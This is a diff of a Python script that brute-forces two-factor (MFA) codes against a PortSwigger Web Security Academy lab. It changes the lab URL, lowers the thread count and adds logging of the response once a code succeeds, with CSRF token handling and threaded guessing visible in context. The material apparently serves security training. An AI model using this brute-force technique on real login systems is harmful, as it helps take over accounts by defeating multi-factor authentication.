@@ -15,11 +15,11 @@ def extract_csrf_token(html):
     return None
 
 # Coloque a url do lab aqui
-base_url = 'https://0a8900dd04f605f480e6954e00e4009d.web-security-academy.net/'
+base_url = 'https://0a98002504f575208cd86718007f00c3.web-security-academy.net/'
 
 tested_mfa_codes = set()
 
-max_threads = 50
+max_threads = 25
 semaphore = threading.Semaphore(max_threads)
 
 def process_mfa_code(mfa_code):
@@ -55,6 +55,10 @@ def process_mfa_code(mfa_code):
 
         if 'Incorrect security code' not in response.text:
             print(f'\033[92mMFA code {mfa_code} valido.\033[0m')
+
+            with open('response.txt', 'w') as f:
+                f.write(f'{mfa_code}\n{response.status_code}\n{response.text}')
+
         else:
             print(f'Mfa code {mfa_code} invalido code: {response.status_code}')
     finally:
